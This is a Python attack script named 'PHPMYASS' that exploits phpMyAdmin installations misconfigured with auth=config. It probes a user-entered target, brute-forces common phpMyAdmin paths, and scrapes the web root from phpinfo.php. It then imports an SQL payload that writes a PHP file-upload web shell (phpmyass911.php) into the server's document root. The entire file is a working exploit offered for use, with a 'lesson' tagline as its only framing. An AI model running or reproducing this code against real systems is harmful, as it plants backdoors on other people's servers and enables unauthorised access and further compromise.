#!/usr/bin/python
###################################################################################################
#
#       _/_/_/_/_/    _/  _/_/_/  _/     _/ _/    _/ _/_/_/_/ _/_/_/_/ _/_/_/_/
#      _/   _/ _/    _/  _/   _/ _/_/ _/_/  _/ _/  _/     _/  _/       _/
#     _/_/_/  _/_/_/_/  _/_/_/  _/  _/ _/   _/    _/_/_/ _/    _/_/     _/_/
#    _/      _/     /  _/      _/     _/   _/    _/     _/        _/       _/
#   _/      _/    _/  _/      _/     _/   _/    _/     _/ _/_/_/_/ _/_/_/_/
## v0.51
# PHPMYASS | A LESSON IN SERVER MISCONFIGURATION | FIZZLE STICK (Professor)
# TESTED AGAINST: WINDOWS W/ UWAMP, XAMPP
# workFLOW: discover, inject, validate, report.....  
# "what does this do?"....
# - this is designed to leverage misconfigured phpmyadmin installations with auth=config.
# - the process is agnostic, and can have sexy time with both windows or linux in theory.
# - We look for the open page, find some crap we need, clean it up, and then create an PHP shell.
# - currently the result is an upload shell.
###################################################################################################

# BING IN OUR LIBS
import sys
import urllib
import mechanize
import logging
from re import findall

# BRING IN SCAPY, QUIET IT DOWN
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
conf.verb=0

# TOR (still experimental)
#import socks
#import socket

# CREATE OUR BROWSER
br = mechanize.Browser()

# DEFINE OUR PHPMYADMIN DIRECTORY TARGETS
mylist = [
'/mysql/',
'/pma/',
'/PMA/',
'/phpmyadmin/',
'/phpMyAdmin/',
'/admin/',
'/dbadmin/',
'/sqlmanager/',
'/sqlweb/'
'/websql/',
'/mysqladmin/']

# DEFINE OUR PHPINFO.PHP TARGETS
mylist2 = [
'/phpinfo.php',
'/xampp/phpinfo.php',
'/somedir/phpinfo.php']

# DEFINE FUNCTION PROBE
def probe(host):
    myprobe = (IP(dst=host)/TCP(dport=80,flags="S"))
    try:
        derp = sr1(myprobe, timeout=1)
        derpy = derp.summary()
        if derpy.find('SA') != -1:
            print "[PORT80S:]\t\t[RESULT:] GOT SYN ACK\t\t\t\t[DECISION:] CONTINUE"
        elif derpy.find('RA') != -1:
            print "[PORT80S:]\t\t[RESULT:] CLOSED GOT RST/ACK\t\t[DECISION:] EXITING"
            sys.exit()
    except Exception, ack:
        print '[HARDEXIT:]\tNO TCP RESPONSE (Firewall/filtered/etc)'
        sys.exit()

# DEFINE CHECKROOT FUNCTION
def checkroot(host):
    funfun = ''
    for pmadir in mylist:
        try:
            openmya = br.open('http://'+host+pmadir+'main.php')
            funfun = 'yes'
            print '[PMADIRS:]\t\t[RESULT:] AWESOME! FOUND IT\t\t\t[DECISION:] CONTINUE'
            global thatdir
            thatdir = pmadir
            disc1 = openmya.read()
            if disc1.find('root@localhost') != -1:
                print "[OPNROOT:]\t\t[RESULT:] FOUND!!! root@localhost\t[DECISION:] CONTINUE"
                break
            else:
                print "[OPNROOT:]\t\t[RESULT:] ..not found....\t\t\t[DECISION:] EXITING"
                break
        except:
            continue
    if funfun != 'yes':
        print '[HARDEXIT:]\t\t[RESULT:] Found NO PMA dirs ;(\t\t[DECISION:] EXITING'
        sys.exit()

# DEFINE WWWFIND FUNCTION
def wwwfind(host):
    funfun2 = ''
    for liner in mylist2:
        try:
            nfosearch = br.open('http://'+host+liner)
            if nfosearch.code == 200:
                phpresp= nfosearch.read()
                print '[PHPNFOS:]\t\t[RESULT:] FOUND PHPINFO.PHP! \t\t[DECISION:] CONTINUE'
                phpresp.count('DOCUMENT_ROOT')
                somedata = findall('DOCUMENT_ROOT +[\D]+[</td><td class="v">]', phpresp)
                nig = str(somedata)
                #len(nig)
                frack = nig.replace('[\'DOCUMENT_ROOT </td><td class="v">', '')
                nerd = str.split(frack)
                wwwdir = nerd[0]
                print '[W3BROOT:]\t\t[RESULT:] FOUND the file root!!\t\t[DECISION:] CONTINUE'
                #### BRING IN THE PAYLOAD
                payload1 = 'CREATE TABLE `phpmyadmin`.`newnew` ( `track2` VARCHAR( 1000 ) NOT NULL ) ENGINE = MYISAM ; INSERT INTO newnew VALUES ("<?php echo \'<form enctype=multipart/form-data action=phpmyass911.php method=POST> <input type=hidden name=MAX_FILE_SIZE value=100000 /> <input name=uploadedfile type=file /><br /><input type=submit value=Upload File /></form>\'; move_uploaded_file($_FILES[uploadedfile][tmp_name], basename( $_FILES[uploadedfile][name]));?> ");select * into dumpfile \''+wwwdir+'/phpmyass911.php\' from newnew;'
                paywrite = open("newnew.sql", "w")
                paywrite.write(payload1)
                paywrite.close()
                print '[PAYLOAD:]\t\t[RESULT:] CREATED w/payload #1\t\t[DECISION:] CONTINUE'
                funfun2 = 'yes'
                break #breakout
        except:
            continue
    if funfun2 != 'yes':
        print '[HARDEXIT:]\t\t[RESULT:] ..not found....\t\t\t[DECISION:] EXITING'
        sys.exit()

# DEFINE SHELLDROP FUNCTION
def shelldrop(host):
    try:
        openmya2 = br.open('http://'+host+thatdir+'db_import.php?db=phpmyadmin')
        if openmya2.code == 200:
            print '[IMPORTS:]\t\t[RESULT:] FOUND IMPORT LINK!!\t\t[DECISION:] CONTINUE'
            importresp = openmya2.read()
            br.select_form(nr=1)
            filename = 'newnew.sql'
            br.form.add_file(open(filename), 'text/plain', filename)
            br.form.set_all_readonly(False)
            br.submit()
            print "[PAYLOAD:]\t\t....SENT!!!!!!!"
            upurl = ('http://'+host+'/phpmyass911.php')
            upchuck = urllib.urlopen(upurl)
            try:
                if upchuck.code == 200:
                    print '[RESULTS:]\t\t<< FINAL SUCCESS!!! >> browse to http://'+host+'/phpmyass911.php'
                else:
                    print '[RESULTS:]\t\t<< YOU LOSE SUCKA!!! >> OH WELL.. better luck next time.. ;D'
            except:
                pass
    except:
        pass

print '==============================================================================='
print '    _/_/_/_/_/    _/  _/_/_/  _/     _/ _/    _/ _/_/_/_/ _/_/_/_/ _/_/_/_/'
print '   _/    _/ _/   _/  _/    _/_/_/ _/_/  _/ _/  _/     _/  _/       _/'
print '  _/_/_/  _/_/_/_/  _/_/_/  _/  _/ _/   _/    _/_/_/ _/    _/_/     _/_/'
print ' _/      _/    _/  _/      _/     _/   _/    _/     _/        _/       _/'
print '_/      _/    _/  _/      _/     _/   _/    _/     _/ _/_/_/_/ _/_/_/_/ v0.51'
print '==============================================================================='
host = raw_input('[TARGET>>] ')
probe(host)
checkroot(host)
wwwfind(host)
shelldrop(host)
print '==============================================================================='
exit

